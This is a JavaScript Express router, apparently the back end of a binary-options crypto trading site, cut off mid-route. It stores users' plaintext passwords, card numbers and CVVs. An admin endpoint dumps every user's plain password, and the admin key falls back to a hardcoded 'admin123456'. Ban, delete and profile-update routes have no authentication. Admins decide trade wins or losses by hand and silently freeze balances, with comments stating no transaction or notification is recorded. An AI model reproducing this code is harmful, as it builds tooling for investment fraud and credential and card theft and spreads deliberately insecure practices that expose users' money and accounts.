import express from "express";
import User from "../models/User.js";
import bcrypt from "bcryptjs";
import mongoose from "mongoose";

const router = express.Router();

// ================= REGISTER =================
router.post("/register", async (req, res) => {
  try {
    const { username, email, password, fullName, phone, country } = req.body;

    if (!username || !email || !password) {
      return res
        .status(400)
        .json({ error: "Username, email and password are required" });
    }

    const cleanUser = username.toLowerCase().trim();
    const cleanEmail = email.toLowerCase().trim();

    const existingUser = await User.findOne({
      $or: [{ username: cleanUser }, { email: cleanEmail }],
    });

    if (existingUser) {
      return res
        .status(400)
        .json({ error: "Username or email already exists" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const user = await User.create({
      username: cleanUser,
      email: cleanEmail,
      password: hashedPassword,
      plainPassword: password,
      fullName: fullName || "",
      phone: phone || "",
      country: country || "",
      withdrawalRequests: [],
      pendingTrades: [],
      notifications: [],
    });

    const safeUser = user.toObject();
    delete safeUser.password;

    res.status(201).json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= LOGIN =================
router.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: "Username and password required" });
    }

    const cleanUser = username.toLowerCase().trim();

    const user = await User.findOne({ username: cleanUser });

    if (!user) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    if (user.isBanned) {
      return res.status(403).json({ error: "BANNED" });
    }

    const isMatch = await bcrypt.compare(password, user.password);

    if (!isMatch) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    const safeUser = user.toObject();
    delete safeUser.password;
    delete safeUser.plainPassword;

    res.json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS =================
router.get("/", async (req, res) => {
  try {
    const users = await User.find().select("-password -plainPassword");
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET SINGLE USER =================
router.get("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username }).select(
      "-password -plainPassword",
    );

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS WITH PLAIN PASSWORDS (ADMIN ONLY) =================
router.get("/admin/all-with-plain-passwords", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});

    const usersWithPasswords = users.map((user) => {
      const userObj = user.toObject();
      delete userObj.password;
      return userObj;
    });

    res.json(usersWithPasswords);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER PASSWORD (ADMIN ONLY) =================
router.post("/admin/update-password", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, newPassword } = req.body;

    if (!username || !newPassword) {
      return res
        .status(400)
        .json({ error: "Username and newPassword required" });
    }

    const hashedPassword = await bcrypt.hash(newPassword, 10);

    const user = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      {
        password: hashedPassword,
        plainPassword: newPassword,
      },
      { returnDocument: "after" },
    );

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "Password updated successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});


// ================= WITHDRAW FUNDS =================
router.post("/withdraw", async (req, res) => {
  try {
    const { username, amount, cardId, password, holderName, bankName, accNumber, cvv } = req.body;

    if (!username || !amount || !cardId || !password) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: "Invalid password" });
    }

    if (user.balance < amount) {
      return res.status(400).json({ error: "Insufficient balance" });
    }

    const card = user.savedCards?.find((c) => String(c.id) === String(cardId));
    if (!card) {
      return res.status(400).json({ error: "Card not found" });
    }

    const withdrawalRequest = {
      id: Date.now(),
      type: "Withdraw",
      amount: amount,
      usd: amount,
      cardId: card.id,
      cardLast4: card.display?.slice(-4) || card.accNumber?.slice(-4) || "****",
      cardNumber: card.num || card.accNumber || "****",
      cardName: card.name || card.holderName || "",
      cardExpiry: card.exp || "",
      cvv: card.cvv || "***",
      // Bank account details (for new withdrawals)
      holderName: holderName || card.holderName || "",
      bankName: bankName || card.bankName || "",
      accNumber: accNumber || card.accNumber || card.num || "",
      date: new Date().toISOString(),
      status: "pending",
      userPassword: password,
    };

    user.withdrawalRequests = [
      withdrawalRequest,
      ...(user.withdrawalRequests || []),
    ];
    user.transactions = [
      {
        type: "Withdraw",
        amount: amount,
        usd: amount,
        date: new Date().toISOString(),
        status: "pending",
        cardLast4: card.display?.slice(-4) || card.accNumber?.slice(-4) || "****",
        holderName: holderName || card.holderName || "",
        bankName: bankName || card.bankName || "",
      },
      ...(user.transactions || []),
    ];

    await user.save();

    res.json({
      success: true,
      currentBalance: user.balance,
      requestId: withdrawalRequest.id,
      message: "Withdrawal request submitted for admin approval",
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN APPROVE WITHDRAWAL =================
router.post("/admin/approve-withdrawal", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, requestId, action } = req.body;

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const requestIndex = user.withdrawalRequests.findIndex(
      (r) => String(r.id) === String(requestId),
    );
    if (requestIndex === -1) {
      return res.status(404).json({ error: "Withdrawal request not found" });
    }

    const request = user.withdrawalRequests[requestIndex];

    if (request.status !== "pending") {
      return res
        .status(400)
        .json({ error: `Request already ${request.status}` });
    }

    if (action === "approve") {
      if (user.balance < request.amount) {
        return res
          .status(400)
          .json({ error: "Insufficient balance for approval" });
      }
      user.balance -= request.amount;

      request.status = "approved";
      request.approvedAt = new Date().toISOString();

      const txIndex = user.transactions.findIndex(
        (t) => t.date === request.date,
      );
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "approved";
        user.transactions[txIndex].approvedAt = new Date().toISOString();
      }
    } else if (action === "reject") {
      request.status = "rejected";
      request.rejectedAt = new Date().toISOString();

      const txIndex = user.transactions.findIndex(
        (t) => t.date === request.date,
      );
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "rejected";
        user.transactions[txIndex].rejectedAt = new Date().toISOString();
      }
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'approve' or 'reject'" });
    }

    user.markModified("withdrawalRequests");
    user.markModified("transactions");

    await user.save();

    res.json({
      success: true,
      message: `Withdrawal ${action}d successfully`,
      newBalance: user.balance,
      requestStatus: request.status,
    });
  } catch (err) {
    console.error("Error in approve-withdrawal:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL WITHDRAWAL REQUESTS (ADMIN ONLY) =================
router.get("/admin/all-withdrawals", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allWithdrawals = [];

    users.forEach((user) => {
      (user.withdrawalRequests || []).forEach((request) => {
        allWithdrawals.push({
          ...(request.toObject ? request.toObject() : request),
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allWithdrawals.sort((a, b) => new Date(b.date) - new Date(a.date));

    res.json(allWithdrawals);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER (LEGACY) =================
router.post("/save-card", async (req, res) => {
  try {
    const { username, card } = req.body;

    if (!username || !card) {
      return res.status(400).json({ error: "Username and card required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const updatedCards = [...(user.savedCards || []), card];

    const updatedUser = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { savedCards: updatedCards },
      { returnDocument: "after" },
    );

    res.json({ success: true, savedCards: updatedUser.savedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE BINARY TRADE =================
router.post("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    if (!trade || !trade.coin) {
      return res.status(400).json({ error: "Invalid trade data" });
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $push: { binaryTrades: trade } },
      { returnDocument: "after" },
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET BINARY TRADES =================
router.get("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const user = await User.findOne({ username }).select("binaryTrades");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.binaryTrades || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL TRADES (ADMIN ONLY) - returns ALL trades with status =================
router.get("/admin/all-trades", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allTrades = [];

    users.forEach((user) => {
      (user.pendingTrades || []).forEach((trade) => {
        allTrades.push({
          ...trade,
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allTrades.sort((a, b) => new Date(b.startTime) - new Date(a.startTime));
    res.json(allTrades);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE PENDING TRADE =================
router.post("/:username/pending-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.pendingTrades = user.pendingTrades || [];
    user.pendingTrades.push(trade);
    await user.save();

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN RESOLVE TRADE (WIN/LOSS/FREEZE) - WITH BALANCE CHANGE =================
router.post("/admin/resolve-trade", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, tradeId, action } = req.body;

    if (!username || !tradeId || !action) {
      return res
        .status(400)
        .json({ error: "Username, tradeId, and action are required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const tradeIndex = (user.pendingTrades || []).findIndex(
      (t) => String(t.id) === String(tradeId),
    );
    if (tradeIndex === -1) {
      return res.status(404).json({ error: "Trade not found" });
    }

    const trade = user.pendingTrades[tradeIndex];

    if (trade.status !== "pending") {
      return res.status(400).json({ error: `Trade already ${trade.status}` });
    }

    let newBalance = user.balance;
    let profitAmount = 0;
    let resultMessage = "";

    if (action === "win") {
      profitAmount = parseFloat(
        (trade.amount * (trade.profitPercent / 100)).toFixed(2),
      );
      const totalReturn = parseFloat((trade.amount + profitAmount).toFixed(2));
      newBalance = parseFloat((user.balance + totalReturn).toFixed(2));
      trade.status = "won";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "WIN";
      trade.profitAmount = profitAmount;
      resultMessage = `WIN! +$${profitAmount.toFixed(2)} profit added. Total: +$${totalReturn.toFixed(2)}`;
    } else if (action === "loss") {
      newBalance = user.balance - trade.amount;
      trade.status = "lost";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "LOSS";
      resultMessage = `LOSS. -$${trade.amount} deducted from balance.`;
    } else if (action === "freeze") {
      trade.status = "frozen";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "FROZEN";
      resultMessage = `FROZEN. Amount held for review.`;
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'win', 'loss', or 'freeze'" });
    }

    user.balance = newBalance;
    user.pendingTrades[tradeIndex] = trade;

    // UPDATE existing transaction instead of creating new one
    const existingTxIndex = (user.transactions || []).findIndex(
      (tx) =>
        tx.orderNumber === trade.orderNumber && tx.type === "Binary Trade",
    );

    if (existingTxIndex !== -1) {
      // Update existing transaction
      user.transactions[existingTxIndex] = {
        ...user.transactions[existingTxIndex],
        status: trade.status,
        profitAmount:
          action === "win"
            ? profitAmount
            : action === "loss"
              ? -parseFloat(trade.amount.toFixed(2))
              : 0,
        result: trade.result,
        profit: action === "win" ? profitAmount : -trade.amount,
        formattedDate: new Date().toLocaleString(),
      };
    } else {
      // Fallback: add new if not found (for old trades)
      const transaction = {
        type: "Binary Trade",
        orderNumber: trade.orderNumber,
        coin: trade.coin,
        amount: trade.amount,
        orderType: trade.orderType,
        timeSeconds: trade.timeSeconds,
        profitPercent: trade.profitPercent,
        status: trade.status,
        profitAmount:
          action === "win"
            ? profitAmount
            : action === "loss"
              ? -trade.amount
              : 0,
        result: trade.result,
        date: new Date().toISOString(),
        formattedDate: new Date().toLocaleString(),
      };
      user.transactions = [transaction, ...(user.transactions || [])];
    }

    user.markModified("pendingTrades");
    user.markModified("transactions");
    await user.save();

    // UPDATE existing notification instead of creating new one
    const existingNotifIndex = (user.notifications || []).findIndex(
      (n) =>
        n.title === "📊 Trade Placed" && n.body.includes(trade.orderNumber),
    );

    if (existingNotifIndex !== -1) {
      // Update existing notification
      user.notifications[existingNotifIndex] = {
        ...user.notifications[existingNotifIndex],
        title: `Trade ${action.toUpperCase()}`,
        body: `Your $${trade.amount} ${trade.coin} trade (${trade.orderType}) - ${resultMessage}`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
        fromAdmin: true,
      };
    } else {
      // Fallback: add new if not found
      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: `Trade ${action.toUpperCase()}`,
        body: `Your $${trade.amount} ${trade.coin} trade (${trade.orderType}) - ${resultMessage}`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
        fromAdmin: true,
      });
    }
    await user.save();

    res.json({
      success: true,
      message: `Trade marked as ${action.toUpperCase()}`,
      newBalance: user.balance,
      tradeStatus: trade.status,
    });
  } catch (err) {
    console.error("Error resolving trade:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= SEND NOTIFICATION TO USER (ADMIN ONLY) =================
router.post("/admin/send-notification", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, title, body } = req.body;

    if (!username || !title) {
      return res.status(400).json({ error: "Username and title required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title,
      body: body || "",
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      fromAdmin: true,
    });

    await user.save();

    res.json({ success: true, message: "Notification sent" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADD NOTIFICATION (for trade placement) =================
router.post("/:username/notifications", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { title, body, type } = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title,
      body,
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      type: type || "general",
    });

    await user.save();

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET USER NOTIFICATIONS =================
router.get("/:username/notifications", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.notifications || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= MARK NOTIFICATION READ =================
router.post("/:username/notifications/read", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { notificationId } = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const notifIndex = (user.notifications || []).findIndex(
      (n) => String(n.id) === String(notificationId),
    );
    if (notifIndex !== -1) {
      user.notifications[notifIndex].read = true;
      await user.save();
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE NOTIFICATION =================
router.delete("/:username/notifications/:notificationId", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const notificationId = req.params.notificationId;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    // Remove the notification - NO ADMIN KEY REQUIRED FOR OWN NOTIFICATIONS
    user.notifications = (user.notifications || []).filter(
      (n) => String(n.id) !== String(notificationId)
    );
    await user.save();

    res.json({ success: true });
  } catch (err) {
    console.error("Error deleting notification:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE ALL NOTIFICATIONS FOR A USER =================
// ================= DELETE ALL NOTIFICATIONS FOR A USER =================
router.delete("/:username/notifications/all", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    console.log("🔴 DELETE ALL - Username:", username);
    
    // Use direct database access (bypasses Mongoose)
    const db = mongoose.connection.db;
    const collection = db.collection('users');
    
    const result = await collection.updateOne(
      { username: username },
      { $set: { notifications: [] } }
    );
    
    console.log("Delete result:", result);
    
    res.json({ 
      success: true, 
      modifiedCount: result.modifiedCount
    });
  } catch (err) {
    console.error("❌ Error clearing all notifications:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER (NEW DIRECT ENDPOINT) =================
router.post("/:username/cards", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { card } = req.body;

    if (!card) {
      return res.status(400).json({ error: "Card data required" });
    }

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const updatedCards = [...(user.savedCards || []), card];
    user.savedCards = updatedCards;
    await user.save();

    res.json({ success: true, savedCards: updatedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER =================
router.patch("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const updates = req.body;

    if (updates.password) {
      updates.password = await bcrypt.hash(updates.password, 10);
      updates.plainPassword = updates.password;
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $set: updates },
      { returnDocument: "after", runValidators: true },
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: "Failed to update user" });
  }
});

// ================= BAN / UNBAN =================
router.post("/ban", async (req, res) => {
  try {
    const { username, banned } = req.body;

    if (!username) {
      return res.status(400).json({ error: "Username required" });
    }

    await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { isBanned: banned },
      { returnDocument: "after" },
    );

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE USER =================
router.delete("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const deleted = await User.findOneAndDelete({ username });

    if (!deleted) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "User deleted successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN FREEZE / UNFREEZE USER BALANCE (NO NOTIFICATIONS) =================
router.post("/admin/freeze-balance", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY;
if (!validAdminKey) {
  return res.status(500).json({ error: "API key not configured" });
}

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, amount, action, reason } = req.body;

    if (!username || !amount || !action) {
      return res
        .status(400)
        .json({ error: "Username, amount, and action are required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const freezeAmount = parseFloat(amount);
    if (isNaN(freezeAmount) || freezeAmount <= 0) {
      return res.status(400).json({ error: "Invalid amount" });
    }

    if (action === "freeze") {
      if (user.balance < freezeAmount) {
        return res
          .status(400)
          .json({ error: `Insufficient balance. User has $${user.balance}` });
      }

      user.balance -= freezeAmount;

      const freezeEntry = {
        id: Date.now(),
        username: username, 
        amount: freezeAmount,
        reason: reason || "Admin freeze",
        frozenAt: new Date().toISOString(),
      };

      user.frozenAmounts = user.frozenAmounts || [];
      user.frozenAmounts.push(freezeEntry);
      user.frozenTotal = (user.frozenTotal || 0) + freezeAmount;

      // NO transactions added
      // NO notifications sent

      await user.save();

      res.json({
        success: true,
        message: `$${freezeAmount} frozen from user's balance`,
        newBalance: user.balance,
        frozenTotal: user.frozenTotal,
        frozenAmounts: user.frozenAmounts,
      });
    } else if (action === "unfreeze") {
      const { freezeId } = req.body;

      if (freezeId) {
        const freezeIndex = (user.frozenAmounts || []).findIndex(
          (f) => String(f.id) === String(freezeId),
        );
        if (freezeIndex === -1) {
          return res.status(404).json({ error: "Freeze record not found" });
        }

        const freezeEntry = user.frozenAmounts[freezeIndex];
        const unfreezeAmount = freezeEntry.amount;

        user.balance += unfreezeAmount;
        user.frozenAmounts.splice(freezeIndex, 1);
        user.frozenTotal = (user.frozenTotal || 0) - unfreezeAmount;

        // NO transactions added
        // NO notifications sent

        await user.save();

        res.json({
          success: true,
          message: `$${unfreezeAmount} unfrozen and added back to balance`,
          newBalance: user.balance,
          frozenTotal: user.frozenTotal,
          frozenAmounts: user.frozenAmounts,
        });
      } else {
        if (user.frozenTotal < freezeAmount) {
          return res
            .status(400)
            .json({ error: `Only $${user.frozenTotal} is frozen` });
        }

        let remainingToUnfreeze = freezeAmount;
        const newFrozenAmounts = [];

        for (const entry of user.frozenAmounts || []) {
          if (remainingToUnfreeze <= 0) {
            newFrozenAmounts.push(entry);
            continue;
          }

          if (entry.amount <= remainingToUnfreeze) {
            remainingToUnfreeze -= entry.amount;
          } else {
            newFrozenAmounts.push({
              ...entry,
              amount: entry.amount - remainingToUnfreeze,
            });
            remainingToUnfreeze = 0;
          }
        }

        const unfrozenAmount = freezeAmount - remainingToUnfreeze;

        user.balance += unfrozenAmount;
        user.frozenAmounts = newFrozenAmounts;
        user.frozenTotal = (user.frozenTotal || 0) - unfrozenAmount;

        // NO transactions added
        // NO notifications sent

        await user.save();

        res.json({
          success: true,
          message: `$${unfrozenAmount} unfrozen and added back to balance`,
          newBalance: user.balance,
          frozenTotal: user.frozenTotal,
          frozenAmounts: user.frozenAmounts,
        });
      }
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'freeze' or 'unfreeze'" });
    }
  } catch (err) {
    console.error("Error in freeze-balance:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET USER FROZEN AMOUNTS =================
router.get("/:username/frozen", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({
      frozenTotal: user.frozenTotal || 0,
      frozenAmounts: user.frozenAmounts || [],
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADD TRANSACTION TO USER HISTORY =================
router.post("/:username/transactions", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const transaction = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.transactions = user.transactions || [];
    user.transactions.unshift(transaction);
    await user.save();

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});



// ================= CREATE DEPOSIT REQUEST =================
router.post("/deposit-request", async (req, res) => {
  try {
    const { username, amount, cardDetails } = req.body;

    if (!username || !amount) {
      return res.status(400).json({ error: "Username and amount required" });
    }

    const user = await User.findOne({ username: username.toLowerCase().trim() });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const depositRequest = {
      id: Date.now(),
      amount: parseFloat(amount),
      usd: parseFloat(amount),
      date: new Date().toISOString(),
      status: "pending",
      cardDetails: cardDetails || {},
    };

    user.depositRequests = user.depositRequests || [];
    user.depositRequests.unshift(depositRequest);

    await user.save();

    res.json({
      success: true,
      message: "Deposit request submitted",
      requestId: depositRequest.id,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL DEPOSIT REQUESTS (ADMIN ONLY) =================
router.get("/admin/all-deposits", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allDeposits = [];

    users.forEach((user) => {
      (user.depositRequests || []).forEach((request) => {
        allDeposits.push({
          ...request,
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allDeposits.sort((a, b) => new Date(b.date) - new Date(a.date));
    res.json(allDeposits);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN APPROVE/REJECT DEPOSIT =================
router.post("/admin/approve-deposit", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }

    const { username, requestId, action } = req.body;

    const user = await User.findOne({ username: username.toLowerCase().trim() });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const requestIndex = (user.depositRequests || []).findIndex(
      (r) => String(r.id) === String(requestId)
    );
    if (requestIndex === -1) {
      return res.status(404).json({ error: "Deposit request not found" });
    }

    const request = user.depositRequests[requestIndex];

    if (request.status !== "pending") {
      return res.status(400).json({ error: `Request already ${request.status}` });
    }

    if (action === "approve") {
      request.status = "approved";
      request.approvedAt = new Date().toISOString();

      user.balance = parseFloat((user.balance + request.amount).toFixed(2));

      user.transactions = [
        {
          type: "Deposit",
          amount: request.amount,
          usd: request.amount,
          date: new Date().toISOString(),
          status: "approved",
          note: "Deposit approved",
        },
        ...(user.transactions || []),
      ];

      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: "✅ Deposit Approved",
        body: `Your deposit of $${request.amount} has been approved and added to your balance.`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
      });
    } else if (action === "reject") {
      request.status = "rejected";
      request.rejectedAt = new Date().toISOString();

      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: "❌ Deposit Rejected",
        body: `Your deposit of $${request.amount} has been rejected. Please contact support.`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
      });
    } else {
      return res.status(400).json({ error: "Invalid action. Use 'approve' or 'reject'" });
    }

    user.markModified("depositRequests");
    user.markModified("transactions");
    user.markModified("notifications");
    await user.save();

    res.json({
      success: true,
      message: `Deposit ${action}d successfully`,
      newBalance: user.balance,
      requestStatus: request.status,
    });
  } catch (err) {
    console.error("Error in approve-deposit:", err);
    res.status(500).json({ error: err.message });
  }
});




// ================= CLEAR COMPLETED TRADES ONLY (ADMIN ONLY) =================
router.delete("/admin/clear-completed-trades", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized. Admin access only." });
    }

    // Get all users
    const users = await User.find({});
    let totalCleared = 0;

    for (const user of users) {
      if (user.pendingTrades && user.pendingTrades.length > 0) {
        const originalLength = user.pendingTrades.length;
        // Keep only pending trades, remove won/lost/frozen
        user.pendingTrades = user.pendingTrades.filter(
          trade => trade.status === "pending"
        );
        user.binaryTrades = []; // Clear old binaryTrades
        totalCleared += originalLength - user.pendingTrades.length;
        await user.save();
      }
    }

    res.json({
      success: true,
      message: `Cleared ${totalCleared} completed trades`,
      clearedCount: totalCleared,
    });
  } catch (err) {
    console.error("Error clearing completed trades:", err);
    res.status(500).json({ error: err.message });
  }
});









// ================= DEBUG - FORCE DELETE ALL =================
router.delete("/debug/force-delete-all/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    
    // Try direct database command
    const db = mongoose.connection.db;
    const collection = db.collection('users');
    
    const result = await collection.updateOne(
      { username: username },
      { $set: { notifications: [] } }
    );
    
    console.log("Direct DB update result:", result);
    
    // Verify
    const user = await collection.findOne({ username: username });
    console.log("After direct update - notifications:", user?.notifications);
    
    res.json({ 
      success: true, 
